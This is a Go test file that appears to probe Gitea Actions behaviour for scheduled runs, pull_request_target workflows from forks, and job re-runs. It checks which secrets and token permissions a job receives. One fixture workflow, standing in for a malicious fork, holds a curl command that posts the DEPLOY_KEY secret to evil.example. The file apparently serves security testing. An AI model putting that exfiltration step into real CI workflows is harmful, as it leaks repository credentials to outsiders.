// ---- schedule ----
func TestProbeScheduleContext(t *testing.T) {
	runner, repo, gitRepo := pSetup(t)
	ctx := t.Context()
	nightly := "name: nightly\non:\n  schedule:\n    - cron: '0 3 * * *'\njobs:\n  build:\n    runs-on: probe-linux\n    steps:\n      - run: make nightly\n"
	fire := func() *runnerv1.Task {
		_, err := db.Exec(ctx, "UPDATE `action_schedule_spec` SET next = ? WHERE repo_id = 4", timeutil.TimeStampNow()-60)
		require.NoError(t, err)
		require.NoError(t, StartScheduleTasks(ctx))
		task, rt := pClaim(t, runner)
		require.NotNil(t, rt)
		pFinish(t, runner, task, runnerv1.Result_RESULT_SUCCESS)
		return rt
	}

	// A: schedule registered by a normal push to the default branch
	c1 := pCommit(t, map[string]string{"nightly.yml": nightly})
	pGit(t, nil, "", "update-ref", "refs/heads/master", c1)
	commit, err := gitRepo.GetCommit(c1)
	require.NoError(t, err)
	alice := unittest.AssertExistsAndLoadBean(t, &user_model.User{ID: 2})
	input := newNotifyInput(repo, alice, webhook_module.HookEventPush).WithRef("refs/heads/master").WithPayload(pPushPayload(c1))
	require.NoError(t, handleSchedules(ctx, pDetected("nightly.yml", "schedule", nightly), commit, input, "refs/heads/master"))

	// the branch moves on without the schedule being re-registered (e.g. a "[skip ci]" push, see earlier report)
	c2 := pCommit(t, map[string]string{"nightly.yml": nightly, "other.yml": "on: workflow_dispatch\njobs:\n  x:\n    runs-on: probe-linux\n    steps:\n      - run: echo\n"})
	pGit(t, nil, "", "update-ref", "refs/heads/master", c2)

	rt := fire()
	run := pLatestRun(t)
	t.Logf("A (registered by a push): %s", pCtx(rt, "event_name", "actor", "triggering_actor", "ref", "event.schedule"))
	t.Logf("A: github.sha=%s  default branch head=%s  (registration commit=%s)", pCtx(rt, "sha")[4:12], c2[:8], c1[:8])
	t.Logf("A: github.event keys: %s", pEventKeys(rt))
	t.Logf("A: github.event leftovers from the registering push: %s", pCtx(rt, "event.pusher.username", "event.head_commit.message", "event.after"))
	t.Logf("A: stored run: event=%q trigger_event=%q; commit statuses on %s:%s", run.Event, run.TriggerEvent, c1[:8], pStatuses(t, c1))

	// B: schedule registered through the bot path (push by gitea-actions, or re-detection)
	require.NoError(t, CleanRepoScheduleTasks(ctx, repo))
	require.NoError(t, DetectAndHandleSchedules(ctx, repo))
	rt = fire()
	run = pLatestRun(t)
	t.Logf("B (registered via DetectAndHandleSchedules): %s", pCtx(rt, "event_name", "actor", "sha", "event.schedule", "event.repository"))
	t.Logf("B: github.event keys: %s; stored run event=%q", pEventKeys(rt), run.Event)
}

// ---- pull_request_target ----
func TestProbePullRequestTarget(t *testing.T) {
	runner, repo, gitRepo := pSetup(t)
	ctx := t.Context()
	_, err := secret_model.InsertEncryptedSecret(ctx, 0, 4, "DEPLOY_KEY", "s3cr3t", "")
	require.NoError(t, err)

	prt := "name: pr-gate\non: pull_request_target\njobs:\n  label:\n    runs-on: probe-linux\n    steps:\n      - run: ./label.sh\n  checks:\n    uses: ./.gitea/workflows/lib.yml\n    secrets: inherit\n"
	libBase := "on:\n  workflow_call:\njobs:\n  base-version-of-lib:\n    runs-on: probe-linux\n    steps:\n      - run: ./trusted-check.sh\n"
	libFork := "on:\n  workflow_call:\njobs:\n  fork-version-of-lib:\n    runs-on: probe-linux\n    steps:\n      - run: curl -d \"$K\" https://evil.example\n        env:\n          K: ${{ secrets.DEPLOY_KEY }}\n"
	base := pCommit(t, map[string]string{"prt.yml": prt, "lib.yml": libBase})
	head := pCommit(t, map[string]string{"prt.yml": prt, "lib.yml": libFork}) // the fork PR's head commit, present in the base repo as refs/pull/7/head
	pGit(t, nil, "", "update-ref", "refs/heads/master", base)

	headCommit, err := gitRepo.GetCommit(head)
	require.NoError(t, err)
	forkAuthor := unittest.AssertExistsAndLoadBean(t, &user_model.User{ID: 4})
	pr := &issues_model.PullRequest{Index: 7, Flow: issues_model.PullRequestFlowGithub, HeadRepoID: 11, BaseRepoID: 4, BaseBranch: "master", HeadBranch: "patch-1"}
	payload := &api.PullRequestPayload{
		Action: api.HookIssueOpened, Index: 7,
		PullRequest: &api.PullRequest{
			Index: 7, Title: "tiny fix",
			Base: &api.PRBranchInfo{Name: "master", Ref: "master", Sha: base, RepoID: 4},
			Head: &api.PRBranchInfo{Name: "patch-1", Ref: "refs/pull/7/head", Sha: head, RepoID: 11},
		},
		Sender: &api.User{UserName: forkAuthor.Name},
	}
	input := newNotifyInput(repo, forkAuthor, webhook_module.HookEventPullRequest).WithPayload(payload).WithPullRequest(pr)
	// exactly what notify() does with a pull_request_target workflow it detected on the BASE commit
	require.NoError(t, handleWorkflows(ctx, pDetected("prt.yml", actions_module.GithubEventPullRequestTarget, prt), headCommit, input, "refs/pull/7/head"))
	run := pLatestRun(t)
	t.Logf("run: trigger=%s fork_pr=%v need_approval=%v run.commit_sha=%s workflow_commit_sha=%s  (base=%s head=%s)",
		run.TriggerEvent, run.IsForkPullRequest, run.NeedApproval, run.CommitSHA[:8], run.WorkflowCommitSHA[:8], base[:8], head[:8])
	require.NoError(t, pEmit(t, run.ID))
	t.Logf("jobs: %s", pJobs(t, run.ID))
	for {
		task, rt := pClaim(t, runner)
		if rt == nil {
			break
		}
		require.NoError(t, task.LoadJob(ctx))
		perms, err := actions_model.ComputeTaskTokenPermissions(ctx, task, repo)
		require.NoError(t, err)
		t.Logf("task for job %q: %s", task.Job.Name, pCtx(rt, "event_name", "ref", "head_ref", "base_ref", "actor"))
		t.Logf("    github.sha=%s  secrets handed over: %s  token: issues=%v pulls=%v code=%v",
			pCtx(rt, "sha")[4:12], pSecretNames(rt), perms.UnitAccessModes[unitIssues], perms.UnitAccessModes[unitPulls], perms.UnitAccessModes[unitCode])
		pFinish(t, runner, task, runnerv1.Result_RESULT_SUCCESS)
	}
	t.Logf("commit statuses on PR head %s:%s", head[:8], pStatuses(t, head))
}

// ---- re-run: artifacts, needs, statuses ----
func TestProbeRerunData(t *testing.T) {
	runner, repo, _ := pSetup(t)
	ctx := t.Context()
	wf := "name: ci\non: push\njobs:\n  build:\n    runs-on: probe-linux\n    outputs:\n      version: ${{ steps.v.outputs.version }}\n    steps:\n      - id: v\n        run: echo version=1.2.3 >> $GITHUB_OUTPUT\n      - uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n  deploy:\n    needs: build\n    runs-on: probe-linux\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n      - run: ./deploy.sh ${{ needs.build.outputs.version }}\n"
	sha := pCommit(t, map[string]string{"ci.yml": wf})
	doer := unittest.AssertExistsAndLoadBean(t, &user_model.User{ID: 5})
	pb, _ := pPushPayload(sha).JSONPayload()
	run := &actions_model.ActionRun{
		Title: "probe", RepoID: 4, OwnerID: 5, WorkflowID: "ci.yml", TriggerUserID: doer.ID, Ref: "refs/heads/master", CommitSHA: sha,
		Event: "push", TriggerEvent: "push", EventPayload: string(pb), WorkflowRepoID: 4, WorkflowCommitSHA: sha,
	}
	require.NoError(t, PrepareRunAndInsert(ctx, []byte(wf), run, nil))

	visible := func(task *actions_model.ActionTask) string {
		// the same queries the artifact API runs for a job's token (artifactsv4.go listArtifacts / getArtifactByName)
		list, err := db.Find[actions_model.ActionArtifact](ctx, actions_model.FindArtifactsOptions{
			RunID: task.Job.RunID, RunAttemptID: optional.Some(task.Job.RunAttemptID), Status: int(actions_model.ArtifactStatusUploadConfirmed), FinalizedArtifactsV4: true,
		})
		require.NoError(t, err)
		names := []string{}
		for _, a := range list {
			names = append(names, a.ArtifactName)
		}
		all, _ := db.Find[actions_model.ActionArtifact](ctx, actions_model.FindArtifactsOptions{RunID: task.Job.RunID})
		return fmt.Sprintf("visible to this job=%v (stored for the run: %d)", names, len(all))
	}

	// attempt 1: build succeeds and uploads, deploy fails
	task, _ := pClaim(t, runner)
	require.NoError(t, task.LoadJob(ctx))
	art, err := actions_model.CreateArtifact(ctx, task, "dist", "dist.zip", 90)
	require.NoError(t, err)
	art.Status, art.ContentEncodingOrType, art.FileSize = actions_model.ArtifactStatusUploadConfirmed, "application/zip", 1024
	require.NoError(t, actions_model.UpdateArtifactByID(ctx, art.ID, art))
	require.NoError(t, actions_model.InsertTaskOutputIfNotExist(ctx, task.ID, "version", "1.2.3"))
	pFinish(t, runner, task, runnerv1.Result_RESULT_SUCCESS)
	require.NoError(t, pEmit(t, run.ID))
	task, rt := pClaim(t, runner)
	require.NoError(t, task.LoadJob(ctx))
	t.Logf("attempt 1 deploy: %s; needs.build=%v; artifacts %s", pCtx(rt, "run_attempt", "actor", "triggering_actor"), rt.Needs["build"], visible(task))
	pFinish(t, runner, task, runnerv1.Result_RESULT_FAILURE)
	require.NoError(t, pEmit(t, run.ID))
	t.Logf("attempt 1 done: %s\n    statuses:%s", pJobs(t, run.ID), pStatuses(t, sha))

	// re-run failed jobs (by a different user)
	rerunner := unittest.AssertExistsAndLoadBean(t, &user_model.User{ID: 2})
	r, _ := actions_model.GetRunByRepoAndID(ctx, 4, run.ID)
	jobs, _ := actions_model.GetRunJobsByRunAndAttemptID(ctx, run.ID, r.LatestAttemptID)
	_, err = RerunWorkflowRunJobs(ctx, repo, r, rerunner, GetFailedJobsForRerun(jobs))
	require.NoError(t, err)
	t.Logf("after re-run failed: %s\n    statuses:%s", pJobs(t, run.ID), pStatuses(t, sha))
	task, rt = pClaim(t, runner)
	require.NotNil(t, rt)
	require.NoError(t, task.LoadJob(ctx))
	t.Logf("attempt 2 deploy: %s; needs.build=%v; artifacts %s", pCtx(rt, "run_attempt", "actor", "triggering_actor"), rt.Needs["build"], visible(task))
}
